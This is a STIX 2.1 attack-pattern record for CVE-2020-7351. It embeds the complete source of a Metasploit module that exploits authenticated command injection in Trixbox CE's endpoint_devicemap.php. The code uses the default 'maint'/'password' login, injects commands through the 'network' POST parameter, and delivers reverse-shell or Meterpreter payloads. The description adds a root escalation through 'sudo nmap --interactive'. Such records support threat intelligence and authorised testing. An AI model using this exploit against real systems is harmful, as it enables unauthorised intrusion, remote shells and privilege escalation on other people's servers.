{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3aba182-5203-48c7-9fd6-b7cc768df29d",
    "created": "2024-08-14T17:13:48.841126Z",
    "modified": "2024-08-14T17:13:48.841131Z",
    "name": "TrixBox CE endpoint_devicemap.php Authenticated Command Execution",
    "description": " This module exploits an authenticated OS command injection vulnerability found in Trixbox CE version 1.2.0 to 2.8.0.4 inclusive in the \"network\" POST parameter of the \"/maint/modules/endpointcfg/endpoint_devicemap.php\" page. Successful exploitation allows for arbitrary command execution on the underlying operating system as the \"asterisk\" user. Users can easily elevate their privileges to the \"root\" user however by executing \"sudo nmap --interactive\" followed by \"!sh\" from within nmap. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/trixbox_ce_endpoint_devicemap_rce.rb",
            "external_id": "trixbox_ce_endpoint_devicemap_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7351"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/13353#Firstrefisthismodule"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TrixBox CE endpoint_devicemap.php Authenticated Command Execution',\n        'Description' => %q{\n          This module exploits an authenticated OS command injection\n          vulnerability found in Trixbox CE version 1.2.0 to 2.8.0.4\n          inclusive in the \"network\" POST parameter of the\n          \"/maint/modules/endpointcfg/endpoint_devicemap.php\" page.\n          Successful exploitation allows for arbitrary command execution\n          on the underlying operating system as the \"asterisk\" user.\n          Users can easily elevate their privileges to the \"root\" user\n          however by executing \"sudo nmap --interactive\" followed by \"!sh\"\n          from within nmap.\n        },\n        'Author' => [\n          # Obrela Labs Team - Discovery and Metasploit module\n          'Anastasios Stasinopoulos (@ancst)'\n        ],\n        'References' => [\n          ['CVE', '2020-7351'],\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/13353'] # First ref is this module\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Payload' => { 'BadChars' => \"\\x00\" },\n        'DisclosureDate' => '2020-04-28',\n        'Targets' => [\n          [\n            'Automatic (Linux Dropper)',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n              'Type' => :linux_dropper\n            }\n          ],\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Type' => :unix_memory\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'User to login with', 'maint']),\n        OptString.new('HttpPassword', [ true, 'Password to login with', 'password']),\n      ]\n    )\n  end\n\n  def user\n    datastore['HttpUsername']\n  end\n\n  def pass\n    datastore['HttpPassword']\n  end\n\n  def get_target(res)\n    version = res.body.scan(/v(\\d.\\d.{0,1}\\d{0,1}.{0,1}\\d{0,1})/).flatten.first\n    if version.nil?\n      version = res.body.scan(/Version: (\\d.\\d.{0,1}\\d{0,1}.{0,1}\\d{0,1})/).flatten.first\n      if version.nil?\n        print_error(\"#{peer} - Unable to grab version of Trixbox CE installed on target!\")\n        return nil\n      end\n    end\n    print_good(\"#{peer} - Trixbox CE v#{version} identified.\")\n    if Rex::Version.new(version).between?(Rex::Version.new('2.6.0.0'), Rex::Version.new('2.8.0.4'))\n      @uri = normalize_uri(target_uri.path, '/maint/modules/endpointcfg/endpoint_devicemap.php')\n    elsif Rex::Version.new(version).between?(Rex::Version.new('2.0.0.0'), Rex::Version.new('2.4.9.9'))\n      @uri = normalize_uri(target_uri.path, '/maint/modules/11_endpointcfg/endpoint_devicemap.php')\n    elsif Rex::Version.new(version).between?(Rex::Version.new('1.2.0.0'), Rex::Version.new('1.9.9.9'))\n      @uri = normalize_uri(target_uri.path, '/maint/endpoint_devicemap.php')\n    else\n      return nil\n    end\n    return version\n  end\n\n  def login(user, pass, _opts = {})\n    uri = normalize_uri(target_uri.path, '/maint/')\n    print_status(\"#{peer} - Authenticating using \\\"#{user}:#{pass}\\\" credentials...\")\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET',\n      'authorization' => basic_auth(user, pass)\n    })\n    unless res\n      # We return nil here, as callers should handle this case\n      # specifically with their own unique error message.\n      return nil\n    end\n\n    if res.code == 200\n      print_good(\"#{peer} - Authenticated successfully.\")\n    elsif res.code == 401\n      print_error(\"#{peer} - Authentication failed.\")\n    else\n      print_error(\"#{peer} - The host responded with an unexpected status code: #{res.code}.\")\n    end\n    return res\n  rescue ::Rex::ConnectionError\n    print_error('Caught a Rex::ConnectionError in login() method. Connection failed.')\n    return nil\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'uri' => @uri,\n      'method' => 'POST',\n      'authorization' => basic_auth(user, pass),\n      'vars_post' => {\n        'network' => \";$(#{cmd})\"\n      }\n    })\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, 'Connection failed.')\n  end\n\n  def check\n    res = login(user, pass)\n    unless res\n      print_error(\"No response was received from #{peer} whilst in check(), check it is online and the target port is open!\")\n      return CheckCode::Detected\n    end\n    if res.code == 200\n      version = get_target(res)\n      if version.nil?\n        # We don't print out an error message here as returning this will\n        # automatically cause Metasploit to print out an appropriate error message.\n        return CheckCode::Safe\n      end\n\n      delay = rand(7...10)\n      cmd = \"sleep #{delay}\"\n      print_status(\"#{peer} - Verifying remote code execution by attempting to execute '#{cmd}'.\")\n      t1 = Time.now.to_i\n      res = execute_command(cmd)\n      t2 = Time.now.to_i\n      unless res\n        print_error(\"#{peer} - Connection failed whilst trying to perform the command injection.\")\n        return CheckCode::Detected\n      end\n      diff = t2 - t1\n      if diff >= delay\n        print_good(\"#{peer} - Response received after #{diff} seconds.\")\n        return CheckCode::Vulnerable\n      else\n        print_error(\"#{peer} - Response wasn't received within the expected period of time.\")\n        return CheckCode::Safe\n      end\n    end\n  rescue ::Rex::ConnectionError\n    print_error(\"#{peer} - Rex::ConnectionError caught in check(), could not connect to the target.\")\n    return CheckCode::Unknown\n  end\n\n  def exploit\n    res = login(user, pass)\n    unless res\n      print_error(\"No response was received from #{peer} whilst in exploit(), check it is online and the target port is open!\")\n    end\n    if res.code == 200\n      version = get_target(res)\n      if version.nil?\n        print_error(\"#{peer} - The target is not vulnerable.\")\n        return false\n      end\n      print_status(\"#{peer} - Sending payload (#{payload.encoded.length} bytes)...\")\n      case target['Type']\n      when :unix_memory\n        execute_command(payload.encoded)\n      when :linux_dropper\n        execute_cmdstager(linemax: 130_000)\n      end\n    end\n  rescue ::Rex::ConnectionError\n    print_error('Rex::ConnectionError caught in check(), could not connect to the target.')\n    return false\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}